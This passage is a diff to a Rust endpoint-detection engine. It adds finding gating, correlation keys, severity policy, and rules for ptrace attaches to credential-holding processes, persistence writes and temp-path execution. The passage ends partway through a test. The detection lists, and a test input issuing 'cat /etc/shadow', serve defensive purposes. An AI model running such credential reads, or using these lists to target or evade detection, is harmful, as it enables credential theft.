@@ -24,25 +24,34 @@
 mod baseline;
 mod beaconing;
 mod behavior;
+pub mod catalog;
 mod dns_tunnel;
+mod files;
+pub mod gate;
 #[cfg(target_os = "linux")] // fed only by the eBPF file-open gate
 pub mod honeytoken;
 mod ioa;
 mod ioc;
 mod netscan;
+pub mod severity;
 pub mod sigma;
+mod stateful;
 
 #[cfg(feature = "yara")]
 pub mod yara_scanner;
 
+use std::sync::atomic::{AtomicBool, Ordering::Relaxed};
 use std::sync::{Mutex, RwLock};
 use std::time::Instant;
 
 use tracing::{info, warn};
 
 use crate::schema::{
-    AgentEvent, DetectionData, EventAction, EventClass, EventData, SetuidData, Severity,
+    AgentEvent, CorrelationKeys, DetectionData, DetectionMode, EventAction, EventClass,
+    EventData, PtraceData, SetuidData, Severity,
 };
+
+use ioa::ProcContext;
 
 pub use ioc::IocSet;
 
@@ -64,6 +73,18 @@ pub struct DetectionEngine {
     baseline: Mutex<baseline::BaselineEngine>,
     /// Runtime switch for the anomaly baseline (config `anomaly_detection_enabled`).
     anomaly_enabled: std::sync::atomic::AtomicBool,
+    /// Multi-event single-host rules (recon bursts, brute force, chmod+exec).
+    stateful: Mutex<stateful::StatefulRules>,
+    /// Suppression + aggregation: the single exit for every finding.
+    gate: Mutex<gate::FindingGate>,
+    /// The agent's own pid: it and its children are never inspected.
+    self_pid: i32,
+    /// Telemetry-source latches. Once eBPF exec / connect / file events are
+    /// flowing, the coarser `/proc`-polled and command-line duplicates of the
+    /// same activity are no longer inspected.
+    ebpf_exec_seen: AtomicBool,
+    ebpf_connect_seen: AtomicBool,
+    file_events_seen: AtomicBool,
     started: Instant,
 }
 
@@ -92,7 +113,23 @@ impl DetectionEngine {
             sigma_enabled: std::sync::atomic::AtomicBool::new(true),
             baseline: Mutex::new(baseline::BaselineEngine::new()),
             anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
+            stateful: Mutex::new(stateful::StatefulRules::new()),
+            gate: Mutex::new(gate::FindingGate::new()),
+            self_pid: std::process::id() as i32,
+            ebpf_exec_seen: AtomicBool::new(false),
+            ebpf_connect_seen: AtomicBool::new(false),
+            file_events_seen: AtomicBool::new(false),
             started: Instant::now(),
+        }
+    }
+
+    /// Replace the operator-defined suppressions (from the signed config).
+    pub fn set_suppressions(&self, rules: Vec<gate::SuppressionRule>) {
+        if let Ok(mut g) = self.gate.lock() {
+            if !rules.is_empty() {
+                info!(count = rules.len(), "Detection engine: suppressions loaded");
+            }
+            g.set_suppressions(rules);
         }
     }
 
@@ -182,24 +219,53 @@ impl DetectionEngine {
         });
     }
 
-    /// Inspect one event, returning any detections it triggers.
+    /// Inspect one event, returning the findings it triggers — enriched with
+    /// correlation keys and severity-finalised, but not yet gated: callers pass
+    /// them through [`Self::admit`] before emitting them.
     ///
-    /// Detections we raise ourselves are skipped to avoid feedback loops.
+    /// Detections we raise ourselves are skipped to avoid feedback loops, and
+    /// so is everything the agent process (or a child it spawned) does.
     pub fn inspect(&self, event: &AgentEvent) -> Vec<AgentEvent> {
         if matches!(event.class, EventClass::Detection) {
             return Vec::new();
         }
+        let now = Instant::now();
+
+        // Stateful IOA correlation runs first: it keeps the process tree
+        // current (so this event's own process resolves), yields the acting
+        // process's context, and emits any attack chains that just completed.
+        let (ioa, ctx, own) = match self.ioa.lock() {
+            Ok(mut e) => {
+                let res = e.observe(event, now);
+                let own = res
+                    .pid
+                    .is_some_and(|p| p == self.self_pid || e.descends_from(self.self_pid, p));
+                let ctx = res.pid.and_then(|p| e.context(p));
+                (res, ctx, own)
+            }
+            Err(_) => (ioa::IoaResult::default(), None, false),
+        };
+        if own {
+            return Vec::new();
+        }
+        let ctx = ctx.as_ref();
 
         let mut out = Vec::new();
         match &event.data {
             EventData::ProcessCreate(p) => {
-                self.inspect_process(
-                    &p.name,
-                    &p.exe,
-                    &p.cmdline,
-                    p.exe_sha256.as_deref(),
-                    &mut out,
-                );
+                // With eBPF exec telemetry every process also arrives as a
+                // ProcessExec; inspecting the /proc-polled copy too would
+                // duplicate every process finding.
+                if !self.ebpf_exec_seen.load(Relaxed) {
+                    self.inspect_process(
+                        &p.name,
+                        &p.exe,
+                        &p.cmdline,
+                        p.exe_sha256.as_deref(),
+                        ctx,
+                        &mut out,
+                    );
+                }
                 #[cfg(windows)]
                 if self
                     .anomaly_enabled
@@ -208,24 +274,24 @@ impl DetectionEngine {
                     if let Ok(mut baseline) = self.baseline.lock() {
                         if let Some(d) = baseline.observe_exec(&p.username, &p.exe, Instant::now())
                         {
-                            let sev = severity_for(d.confidence);
-                            out.push(self.detection(sev, d));
+                            out.push(self.detection(Severity::Info, d));
                         }
                     }
                 }
             }
             EventData::ProcessExec(p) => {
+                self.ebpf_exec_seen.store(true, Relaxed);
                 self.inspect_process(
                     &p.comm,
                     &p.exe,
                     &p.cmdline,
                     p.exe_sha256.as_deref(),
+                    ctx,
                     &mut out,
                 );
                 if let Some(ref ld_preload) = p.ld_preload {
                     if let Some(d) = behavior::inspect_ld_preload(&p.comm, &p.exe, ld_preload) {
-                        let sev = severity_for(d.confidence);
-                        out.push(self.detection(sev, d));
+                        out.push(self.detection(Severity::Info, d));
                     }
                 }
                 // Statistical behavioural baseline (config-gated): per-user
@@ -236,8 +302,7 @@ impl DetectionEngine {
                 {
                     if let Ok(mut b) = self.baseline.lock() {
                         if let Some(d) = b.observe_exec(&p.username, &p.exe, Instant::now()) {
-                            let sev = severity_for(d.confidence);
-                            out.push(self.detection(sev, d));
+                            out.push(self.detection(Severity::Info, d));
                         }
                     }
                 }
@@ -246,18 +311,57 @@ impl DetectionEngine {
                 self.inspect_setuid(s, &mut out);
             }
             EventData::NetworkConnection(n) => {
-                self.inspect_network(&n.dst_addr, n.dst_port, &mut out);
+                // Flow-start records only (the poller also emits a `closed`
+                // record per flow), and only while no eBPF connect telemetry
+                // reports the same connections.
+                if n.state != "closed" && !self.ebpf_connect_seen.load(Relaxed) {
+                    self.inspect_network(&n.dst_addr, n.dst_port, &mut out);
+                }
             }
-            EventData::NetworkSocket(n) => {
-                self.inspect_network(&n.addr, n.port, &mut out);
-            }
-            EventData::Dns(d) => {
-                // The eBPF DNS event carries the resolver address; treat the
-                // destination as a domain candidate when it is non-numeric.
-                self.inspect_domain(&d.dst_addr, &mut out);
+            EventData::NetworkSocket(n) => match n.op.as_str() {
+                "connect" => {
+                    self.ebpf_connect_seen.store(true, Relaxed);
+                    self.inspect_network(&n.addr, n.port, &mut out);
+                }
+                // An inbound peer is only an IOC question; cadence and scan
+                // analytics are about where *we* connect to.
+                "accept" => self.inspect_ioc_ip(&n.addr, n.port, &mut out),
+                _ => {}
+            },
+            // `DnsData` carries only the resolver address. Domain analytics
+            // run on the resolved name from `DnsResolution`.
+            EventData::DnsResolution(r) => {
+                self.inspect_domain(&r.qname, &mut out);
             }
             EventData::FileOpen(f) => {
+                self.file_events_seen.store(true, Relaxed);
+                if files::is_write_open(f.flags) {
+                    self.inspect_file_write(&f.path, &f.comm, ctx, &mut out);
+                }
                 self.inspect_file_open(&f.path, &f.comm, &mut out);
+            }
+            EventData::FileRename(r) => {
+                self.file_events_seen.store(true, Relaxed);
+                self.inspect_file_write(&r.new_path, &r.comm, ctx, &mut out);
+            }
+            EventData::FileChmod(c) => {
+                if c.mode & 0o111 != 0 && is_temp_path(&c.path) {
+                    if let Ok(mut st) = self.stateful.lock() {
+                        st.observe_chmod_exec(&c.path, self.started.elapsed().as_secs_f64());
+                    }
+                }
+            }
+            EventData::Ptrace(p) => {
+                self.inspect_ptrace(p, &mut out);
+            }
+            EventData::UserLogon(l) => {
+                let src = l.src_addr.as_deref().unwrap_or("");
+                let hit = self.stateful.lock().ok().and_then(|mut st| {
+                    st.observe_logon(&l.username, src, l.success, self.started.elapsed().as_secs_f64())
+                });
+                if let Some(d) = hit {
+                    out.push(self.detection(Severity::Info, d));
+                }
             }
             EventData::Log(l) => {
                 // Log records feed the same engine: a sudo COMMAND is an
@@ -267,6 +371,7 @@ impl DetectionEngine {
                         l.proc.as_deref().unwrap_or("unknown"),
                         "",
                         cmd,
+                        None,
                         None,
                         &mut out,
                     );
@@ -283,7 +388,7 @@ impl DetectionEngine {
                         .or_else(|| l.fields.get("destinationport"))
                         .and_then(|v| v.as_u64())
                         .unwrap_or(0) as u16;
-                    self.inspect_network(ip, port, &mut out);
+                    self.inspect_ioc_ip(ip, port, &mut out);
                 }
             }
             _ => {}
@@ -306,14 +411,8 @@ impl DetectionEngine {
             }
         }
 
-        // Stateful IOA correlation. Updates the process tree from this event,
-        // then (a) enriches the per-event findings above with the actor's
-        // process lineage and (b) emits any attack chains that just completed.
-        let ioa = self
-            .ioa
-            .lock()
-            .map(|mut e| e.observe(event, Instant::now()))
-            .unwrap_or_default();
+        // Enrich the per-event findings with the actor's process lineage, then
+        // add the attack chains that just completed.
         if let Some(lineage) = &ioa.lineage {
             for ev in out.iter_mut() {
                 if let EventData::Detection(d) = &mut ev.data {
@@ -322,11 +421,149 @@ impl DetectionEngine {
             }
         }
         for data in ioa.findings {
-            let sev = severity_for(data.confidence);
-            out.push(self.detection(sev, data));
+            out.push(self.detection(Severity::Info, data));
         }
 
+        for ev in out.iter_mut() {
+            self.finalize(ev, Some(event), ctx);
+        }
         out
+    }
+
+    /// Pass findings through the gate (suppression + aggregation). Only what
+    /// this returns may be emitted.
+    pub fn admit(&self, findings: Vec<AgentEvent>) -> Vec<gate::Emitted> {
+        if findings.is_empty() {
+            return Vec::new();
+        }
+        let now = Instant::now();
+        match self.gate.lock() {
+            Ok(mut g) => findings.into_iter().flat_map(|f| g.admit(f, now)).collect(),
+            Err(e) => {
+                warn!("Detection gate lock poisoned: {e}");
+                findings
+                    .into_iter()
+                    .map(|event| gate::Emitted {
+                        event,
+                        aggregate: false,
+                    })
+                    .collect()
+            }
+        }
+    }
+
+    /// Admit a detection a collector raised directly (memory scan, rootkit,
+    /// filesystem, honeytokens): enrich it from the process tree, finalise its
+    /// severity and gate it like an engine finding.
+    pub fn admit_external(&self, mut event: AgentEvent) -> Vec<gate::Emitted> {
+        if let EventData::Detection(d) = &event.data {
+            let pid = d
+                .evidence
+                .get("pid")
+                .or_else(|| d.evidence.get("accessor_pid"))
+                .and_then(|v| v.as_i64())
+                .map(|p| p as i32)
+                .or_else(|| d.correlation.as_ref().and_then(|c| c.pid));
+            let (ctx, own, lineage) = match (pid, self.ioa.lock()) {
+                (Some(pid), Ok(e)) => (
+                    e.context(pid),
+                    pid == self.self_pid || e.descends_from(self.self_pid, pid),
+                    e.lineage(pid),
+                ),
+                _ => (None, false, None),
+            };
+            if own {
+                return Vec::new();
+            }
+            if let (EventData::Detection(d), Some(lineage)) = (&mut event.data, &lineage) {
+                if d.evidence.get("process_lineage").is_none() {
+                    inject_lineage(&mut d.evidence, lineage);
+                }
+            }
+            self.finalize(&mut event, None, ctx.as_ref());
+        }
+        self.admit(vec![event])
+    }
+
+    /// Aggregate updates that are due (or everything pending, on shutdown).
+    pub fn flush_findings(&self, force: bool) -> Vec<gate::Emitted> {
+        self.gate
+            .lock()
+            .map(|mut g| g.flush(Instant::now(), force))
+            .unwrap_or_default()
+    }
+
+    /// Stamp a finding with correlation keys, catalog metadata, the severity
+    /// policy's verdict and its dedup key.
+    fn finalize(&self, ev: &mut AgentEvent, trigger: Option<&AgentEvent>, ctx: Option<&ProcContext>) {
+        let emitted_severity = ev.severity;
+        let EventData::Detection(d) = &mut ev.data else {
+            return;
+        };
+        if !catalog::is_known(&d.rule_id) {
+            crate::telemetry::metrics::metrics().detection_uncatalogued();
+        }
+        let meta = catalog::lookup(&d.rule_id);
+        if d.mitre_tactic.is_none() && !meta.tactic.is_empty() {
+            d.mitre_tactic = Some(meta.tactic.into());
+        }
+        if d.mitre_technique.is_none() && !meta.technique.is_empty() {
+            d.mitre_technique = Some(meta.technique.into());
+        }
+
+        // Correlation: what the rule set itself wins, then the process tree,
+        // then the triggering event, then the structured evidence.
+        let mut c = d.correlation.take().unwrap_or_default();
+        if let Some(ctx) = ctx {
+            fill(&mut c.process_key, Some(ctx.process_key.clone()));
+            fill(&mut c.parent_key, ctx.parent_key.clone());
+            fill(&mut c.root_key, ctx.root_key.clone());
+            fill(&mut c.pid, Some(ctx.pid));
+            fill(&mut c.user, Some(ctx.username.clone()).filter(|u| !u.is_empty()));
+            fill(&mut c.exe, Some(ctx.exe.clone()).filter(|e| !e.is_empty()));
+            fill(&mut c.exe_sha256, ctx.exe_hash.clone());
+            fill(&mut c.container_id, ctx.container_id.clone());
+            if c.lineage_keys.is_empty() {
+                c.lineage_keys = ctx.lineage_keys.clone();
+            }
+        }
+        if let Some(t) = trigger {
+            entities_from_event(t, &mut c);
+        }
+        entities_from_evidence(&d.evidence, &mut c);
+        d.correlation = Some(c);
+
+        // Severity: the rule's own base (when it set one) or the catalog's;
+        // families that carry their own severity keep the emitted one.
+        let base = d.base_severity.unwrap_or(if meta.base_from_event {
+            emitted_severity
+        } else {
+            meta.base
+        });
+        let base = base.min(meta.max);
+        let mut flags: Vec<String> = ctx
+            .map(|c| c.flags.iter().map(|f| f.to_string()).collect())
+            .unwrap_or_default();
+        for f in d.context_flags.drain(..) {
+            if !flags.contains(&f) {
+                flags.push(f);
+            }
+        }
+        let mut input = severity::PolicyInput::from_meta(&meta, base, d.confidence, flags.clone());
+        if let Some(mode) = d.mode {
+            // A rule may demote itself to a signal; it can never promote a
+            // catalog signal to an alert.
+            if meta.mode == DetectionMode::Alert {
+                input.mode = mode;
+            }
+        }
+        let outcome = severity::evaluate(&input);
+        d.mode = Some(outcome.mode);
+        d.base_severity = Some(base);
+        d.severity_reasons = outcome.reasons;
+        d.context_flags = flags;
+        ev.severity = outcome.severity;
+        d.dedup_key = Some(dedup_key(&meta, d));
     }
 
     // ── Per-source inspectors ────────────────────────────────────────────────
@@ -337,6 +574,7 @@ impl DetectionEngine {
         exe: &str,
         cmdline: &str,
         exe_hash: Option<&str>,
+        ctx: Option<&ProcContext>,
         out: &mut Vec<AgentEvent>,
     ) {
         // IOC: known-bad executable hash.
@@ -355,19 +593,149 @@ impl DetectionEngine {
                         subject: exe.to_string(),
                         detail: format!("Executable {exe} matches threat-intel hash {h}"),
                         evidence: serde_json::json!({ "hash": h, "comm": comm }),
+                        correlation: Some(CorrelationKeys {
+                            exe_sha256: Some(h.to_string()),
+                            ..Default::default()
+                        }),
+                        ..Default::default()
                     },
                 ));
             }
         }
 
-        // Behavioural heuristics.
-        if let Some(d) = behavior::inspect_process(comm, exe, cmdline) {
-            let sev = severity_for(d.confidence);
-            out.push(self.detection(sev, d));
+        // Behavioural heuristics. Once file telemetry is flowing, the file
+        // rules see persistence writes precisely (real path, real writer), so
+        // the command-line guesses for the same rules are dropped.
+        let file_events = self.file_events_seen.load(Relaxed);
+        if let Some(d) = behavior::inspect_process_with(comm, exe, cmdline, ctx) {
+            if !(file_events && files::FILE_COVERED_RULES.contains(&d.rule_id.as_str())) {
+                self.note_unit_write(&d, ctx);
+                out.push(self.detection(Severity::Info, d));
+            }
+        }
+        for d in behavior::inspect_process_context(comm, exe, cmdline, ctx) {
+            out.push(self.detection(Severity::Info, d));
+        }
+
+        // Session-level stateful rules.
+        let base = comm.rsplit('/').next().unwrap_or(comm);
+        let session = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()));
+        let now = self.started.elapsed().as_secs_f64();
+        if let Ok(mut st) = self.stateful.lock() {
+            if let Some(session) = &session {
+                if let Some(d) = st.observe_exec_recon(session, base, cmdline, now) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+                if base == "systemctl" {
+                    if let Some(d) = st.observe_systemctl(session, cmdline, now) {
+                        out.push(self.detection(Severity::Info, d));
+                    }
+                }
+            }
+            if is_temp_path(exe) {
+                if let Some(d) = st.observe_temp_exec(exe, now) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+            }
         }
     }
 
+    /// Remember a systemd unit written in this session, so a following
+    /// `systemctl enable` escalates it.
+    fn note_unit_write(&self, d: &DetectionData, ctx: Option<&ProcContext>) {
+        if d.rule_id != "persistence.systemd_unit" {
+            return;
+        }
+        let Some(session) = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()))
+        else {
+            return;
+        };
+        if let Ok(mut st) = self.stateful.lock() {
+            st.observe_unit_write(&session, &d.subject, self.started.elapsed().as_secs_f64());
+        }
+    }
+
+    /// A write (open for write, or rename onto) to a persistence location.
+    fn inspect_file_write(
+        &self,
+        path: &str,
+        comm: &str,
+        ctx: Option<&ProcContext>,
+        out: &mut Vec<AgentEvent>,
+    ) {
+        // Package installs and configuration management write these locations
+        // by design.
+        let managed = ctx.is_some_and(|c| {
+            c.flags.iter().any(|f| {
+                *f == severity::FLAG_PKG_MGR_LINEAGE || *f == severity::FLAG_CONFIG_MGMT_LINEAGE
+            })
+        });
+        if managed {
+            return;
+        }
+        if let Some(d) = files::inspect_write(path, comm) {
+            self.note_unit_write(&d, ctx);
+            out.push(self.detection(Severity::Info, d));
+        }
+    }
+
+    /// ptrace attach/seize to a credential-holding process.
+    fn inspect_ptrace(&self, p: &PtraceData, out: &mut Vec<AgentEvent>) {
+        const PTRACE_ATTACH: u32 = 16;
+        const PTRACE_SEIZE: u32 = 0x4206;
+        const CRED_HOLDERS: &[&str] = &[
+            "sshd", "sudo", "su", "passwd", "login", "gnome-keyring-d", "ssh-agent", "gpg-agent",
+            "systemd-logind", "polkitd", "vault", "keepassxc",
+        ];
+        if p.request != PTRACE_ATTACH && p.request != PTRACE_SEIZE {
+            return;
+        }
+        let target = self
+            .ioa
+            .lock()
+            .ok()
+            .and_then(|e| e.comm_of(p.target_pid))
+            .unwrap_or_default();
+        if !CRED_HOLDERS.contains(&target.as_str()) {
+            return;
+        }
+        out.push(self.detection(
+            Severity::Info,
+            DetectionData {
+                rule_id: "creds.proc_mem_access".into(),
+                title: "Debugger attached to a credential-holding process".into(),
+                category: "credential_access".into(),
+                mitre_tactic: Some("TA0006 Credential Access".into()),
+                mitre_technique: Some("T1003.007".into()),
+                confidence: 85,
+                subject: format!("{} (pid {})", target, p.target_pid),
+                detail: format!(
+                    "{} (pid {}) ptrace-attached to {} (pid {})",
+                    p.comm, p.pid, target, p.target_pid
+                ),
+                evidence: serde_json::json!({
+                    "pid": p.pid,
+                    "target_pid": p.target_pid,
+                    "target_comm": target,
+                    "request": p.request,
+                }),
+                ..Default::default()
+            },
+        ));
+    }
+
     fn inspect_setuid(&self, s: &SetuidData, out: &mut Vec<AgentEvent>) {
+        // The setuid-root binaries whose whole purpose is to become root; a
+        // finding per `sudo` would bury everything else.
+        const SANCTIONED: &[&str] = &[
+            "sudo", "su", "passwd", "pkexec", "newgrp", "chsh", "chfn", "gpasswd", "mount",
+            "umount", "fusermount", "fusermount3", "unix_chkpwd", "ssh-keysign", "polkit-agent-he",
+            "dbus-daemon-lau", "Xorg", "crontab", "at", "doas", "sshd", "login", "cron", "systemd",
+            "snap-confine", "chrome-sandbox", "ping",
+        ];
+        if SANCTIONED.contains(&s.comm.as_str()) {
+            return;
+        }
         if s.new_uid == 0 && s.old_uid != 0 {
             out.push(self.detection(
                 Severity::High,
@@ -389,13 +757,19 @@ impl DetectionEngine {
                         "new_uid": s.new_uid,
                         "comm":    s.comm,
                     }),
+                    ..Default::default()
                 },
             ));
         }
     }
 
     fn inspect_network(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
-        // IOC: known-bad destination IP.
+        self.inspect_ioc_ip(dst_addr, dst_port, out);
+        self.inspect_network_behaviour(dst_addr, dst_port, out);
+    }
+
+    /// IOC: a connection to / from a known-bad IP.
+    fn inspect_ioc_ip(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
         let ip_hit = self
             .iocs
             .read()
@@ -414,10 +788,14 @@ impl DetectionEngine {
                     subject: format!("{dst_addr}:{dst_port}"),
                     detail: format!("Outbound connection to threat-intel IP {dst_addr}:{dst_port}"),
                     evidence: serde_json::json!({ "ip": dst_addr, "port": dst_port }),
+                    ..Default::default()
                 },
             ));
         }
+    }
 
+    /// Cadence / scan / IMDS analytics over outbound connections.
+    fn inspect_network_behaviour(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
         let now = self.started.elapsed().as_secs_f64();
 
         // Beaconing cadence analysis (skip loopback / unspecified noise).
@@ -448,6 +826,7 @@ impl DetectionEngine {
                             "cv": v.coefficient_of_variation,
                             "samples": v.samples,
                         }),
+                        ..Default::default()
                     },
                 ));
             }
@@ -484,6 +863,7 @@ impl DetectionEngine {
                 subject: target.clone(),
                 detail: format!("{ports} distinct ports contacted on {target} within the window"),
                 evidence: serde_json::json!({ "target": target, "ports": ports }),
+                ..Default::default()
             },
             NetVerdict::LateralMovement { port, service, hosts } => DetectionData {
                 rule_id: "lateral.admin_port_sweep".into(),
@@ -495,6 +875,7 @@ impl DetectionEngine {
                 subject: format!("{service}:{port}"),
                 detail: format!("{hosts} distinct internal hosts contacted on {service} ({port})"),
                 evidence: serde_json::json!({ "port": port, "service": service, "hosts": hosts }),
+                ..Default::default()
             },
             NetVerdict::ImdsAccess => DetectionData {
                 rule_id: "cloud.imds_access".into(),
@@ -506,6 +887,7 @@ impl DetectionEngine {
                 subject: format!("{dst_addr}:{dst_port}"),
                 detail: format!("Connection to cloud metadata endpoint {dst_addr} (IMDS credential theft vector)"),
                 evidence: serde_json::json!({ "ip": dst_addr, "port": dst_port }),
+                ..Default::default()
             },
         };
         let severity = severity_for(data.confidence);
@@ -543,6 +925,7 @@ impl DetectionEngine {
                     subject: domain.to_string(),
                     detail: format!("Resolved {domain}, matching threat-intel domain {matched}"),
                     evidence: serde_json::json!({ "domain": domain, "matched": matched }),
+                    ..Default::default()
                 },
             ));
         }
@@ -575,6 +958,7 @@ impl DetectionEngine {
                         "avg_label_length": v.avg_label_length,
                         "reason": v.reason,
                     }),
+                    ..Default::default()
                 },
             ));
         }
@@ -589,7 +973,7 @@ impl DetectionEngine {
             EventClass::Detection,
             EventAction::Detected,
             severity,
-            EventData::Detection(data),
+            EventData::Detection(Box::new(data)),
         )
     }
 }
@@ -604,6 +988,142 @@ fn inject_lineage(evidence: &mut serde_json::Value, lineage: &serde_json::Value)
     if let Some(obj) = evidence.as_object_mut() {
         obj.insert("process_lineage".to_string(), lineage.clone());
     }
+}
+
+/// Set `slot` from `value` unless it already holds something.
+fn fill<T>(slot: &mut Option<T>, value: Option<T>) {
+    if slot.is_none() {
+        *slot = value;
+    }
+}
+
+/// Entities named by the event that triggered a finding.
+fn entities_from_event(ev: &AgentEvent, c: &mut CorrelationKeys) {
+    match &ev.data {
+        EventData::ProcessExec(p) => {
+            fill(&mut c.pid, Some(p.pid));
+            fill(&mut c.exe, Some(p.exe.clone()).filter(|e| !e.is_empty()));
+            fill(&mut c.exe_sha256, p.exe_sha256.clone());
+            fill(&mut c.user, Some(p.username.clone()).filter(|u| !u.is_empty()));
+            fill(&mut c.container_id, p.container_id.clone());
+        }
+        EventData::ProcessCreate(p) => {
+            fill(&mut c.pid, Some(p.pid));
+            fill(&mut c.exe, Some(p.exe.clone()).filter(|e| !e.is_empty()));
+            fill(&mut c.exe_sha256, p.exe_sha256.clone());
+            fill(&mut c.user, Some(p.username.clone()).filter(|u| !u.is_empty()));
+        }
+        EventData::NetworkConnection(n) => {
+            fill(&mut c.pid, n.pid);
+            fill(&mut c.remote_ip, Some(n.dst_addr.clone()));
+            fill(&mut c.remote_port, Some(n.dst_port));
+        }
+        EventData::NetworkSocket(n) => {
+            fill(&mut c.pid, Some(n.pid));
+            fill(&mut c.user, Some(n.username.clone()).filter(|u| !u.is_empty()));
+            if n.op == "connect" || n.op == "accept" {
+                fill(&mut c.remote_ip, Some(n.addr.clone()));
+                fill(&mut c.remote_port, Some(n.port));
+            }
+        }
+        EventData::DnsResolution(r) => {
+            fill(&mut c.domain, Some(r.qname.clone()));
+        }
+        EventData::FileOpen(f) => {
+            fill(&mut c.pid, Some(f.pid));
+            fill(&mut c.file_path, Some(f.path.clone()));
+            fill(&mut c.user, Some(f.username.clone()).filter(|u| !u.is_empty()));
+        }
+        EventData::FileRename(r) => {
+            fill(&mut c.pid, Some(r.pid));
+            fill(&mut c.file_path, Some(r.new_path.clone()));
+        }
+        EventData::FileChmod(f) => {
+            fill(&mut c.pid, Some(f.pid));
+            fill(&mut c.file_path, Some(f.path.clone()));
+        }
+        EventData::Ptrace(p) => fill(&mut c.pid, Some(p.pid)),
+        EventData::Setuid(s) => fill(&mut c.pid, Some(s.pid)),
+        EventData::UserLogon(l) => {
+            fill(&mut c.user, Some(l.username.clone()));
+            fill(&mut c.remote_ip, l.src_addr.clone());
+        }
+        _ => {}
+    }
+}
+
+/// Entities a finding's structured evidence names (`path`, `ip`, `domain`).
+fn entities_from_evidence(evidence: &serde_json::Value, c: &mut CorrelationKeys) {
+    let s = |k: &str| evidence.get(k).and_then(|v| v.as_str()).map(String::from);
+    fill(&mut c.file_path, s("path").filter(|p| p.starts_with('/')));
+    fill(&mut c.remote_ip, s("ip"));
+    fill(&mut c.domain, s("domain"));
+    fill(
+        &mut c.pid,
+        evidence.get("pid").and_then(|v| v.as_i64()).map(|p| p as i32),
+    );
+}
+
+/// The gate key repeats of a finding share, per the catalog's strategy.
+fn dedup_key(meta: &catalog::RuleMeta, d: &DetectionData) -> String {
+    use catalog::KeyStrategy;
+    use sha2::{Digest, Sha256};
+    let c = d.correlation.clone().unwrap_or_default();
+    let or = |v: &Option<String>| v.clone().unwrap_or_default();
+    let actor = c.exe.clone().unwrap_or_else(|| d.subject.clone());
+    let material = match meta.dedup {
+        KeyStrategy::Command => {
+            let cmd = d
+                .evidence
+                .get("cmdline")
+                .and_then(|v| v.as_str())
+                .unwrap_or(&d.subject);
+            format!("{}|{}|{}", or(&c.user), actor, normalize_cmdline(cmd))
+        }
+        KeyStrategy::Process => c.process_key.clone().unwrap_or_else(|| d.subject.clone()),
+        KeyStrategy::ProcessRemote => {
+            let remote = c
+                .domain
+                .clone()
+                .or_else(|| c.remote_ip.clone())
+                .unwrap_or_else(|| d.subject.clone());
+            format!("{}|{}", c.exe.clone().unwrap_or_default(), remote)
+        }
+        KeyStrategy::Path => format!(
+            "{}|{}|{}",
+            or(&c.user),
+            actor,
+            c.file_path.clone().unwrap_or_else(|| d.subject.clone())
+        ),
+        KeyStrategy::Subject => d.subject.clone(),
+    };
+    let digest = Sha256::digest(material.as_bytes());
+    format!("{}:{}", d.rule_id, hex::encode(&digest[..8]))
+}
+
+/// Digits are run-varying noise (pids, ports, timestamps): fold them.
+fn normalize_cmdline(cmd: &str) -> String {
+    let mut out = String::with_capacity(cmd.len());
+    let mut in_digits = false;
+    for ch in cmd.split_whitespace().collect::<Vec<_>>().join(" ").chars() {
+        if ch.is_ascii_digit() {
+            if !in_digits {
+                out.push('#');
+            }
+            in_digits = true;
+        } else {
+            in_digits = false;
+            out.push(ch);
+        }
+    }
+    out
+}
+
+/// True if `path` is in a world-writable / in-memory location.
+fn is_temp_path(path: &str) -> bool {
+    ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
+        .iter()
+        .any(|p| path.starts_with(p))
 }
 
 /// Translate a matched Sigma rule into the agent's detection record. The
@@ -645,6 +1165,7 @@ fn sigma_detection(rule: &sigma::CompiledRule, view: &sigma::fields::FieldView) 
             "tags": rule.tags,
             "category": view.category,
         }),
+        ..Default::default()
     }
 }
 
@@ -709,6 +1230,13 @@ mod tests {
             sigma_enabled: std::sync::atomic::AtomicBool::new(true),
             baseline: Mutex::new(baseline::BaselineEngine::new()),
             anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
+            stateful: Mutex::new(stateful::StatefulRules::new()),
+            gate: Mutex::new(gate::FindingGate::new()),
+            // Not this test process: tests feed synthetic pids.
+            self_pid: i32::MAX,
+            ebpf_exec_seen: AtomicBool::new(false),
+            ebpf_connect_seen: AtomicBool::new(false),
+            file_events_seen: AtomicBool::new(false),
             started: Instant::now(),
         }
     }
@@ -894,6 +1422,7 @@ mod tests {
                 subject: "s".into(),
                 detail: "d".into(),
                 evidence: serde_json::Value::Null,
+                ..Default::default()
             },
         );
         assert!(e.inspect(&det).is_empty());
@@ -914,5 +1443,347 @@ mod tests {
             hit,
             "expected a beaconing verdict for a regular 60s cadence"
         );
+    }
+    // ── Correlation, severity, gate, noise ───────────────────────────────
+
+    fn exec(pid: i32, ppid: i32, uid: u32, comm: &str, exe: &str, cmd: &str) -> AgentEvent {
+        AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::Process,
+            EventAction::Exec,
+            Severity::Info,
+            EventData::ProcessExec(Box::new(ExecEventData {
+                pid,
+                ppid,
+                uid,
+                gid: uid,
+                username: if uid == 0 { "root".into() } else { "u".into() },
+                comm: comm.into(),
+                exe: exe.into(),
+                cmdline: cmd.into(),
+                cwd: "/".into(),
+                process_start_time: Some(1000 + pid as u64),
+                ..Default::default()
+            })),
+        )
+    }
+
+    fn det_of(ev: &AgentEvent) -> &DetectionData {
+        match &ev.data {
+            EventData::Detection(d) => d,
+            _ => panic!("not a detection"),
+        }
+    }
+
+    fn find<'a>(out: &'a [AgentEvent], rule: &str) -> Option<&'a AgentEvent> {
+        out.iter().find(|e| det_of(e).rule_id == rule)
+    }
+
+    #[test]
+    fn findings_carry_process_correlation_and_catalog_severity() {
+        let e = engine();
+        e.inspect(&exec(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd: u"));
+        e.inspect(&exec(200, 100, 0, "bash", "/bin/bash", "-bash"));
+        let out = e.inspect(&exec(300, 200, 0, "cat", "/usr/bin/cat", "cat /etc/shadow"));
+        let ev = find(&out, "creds.shadow_read").expect("shadow read fires");
+        let d = det_of(ev);
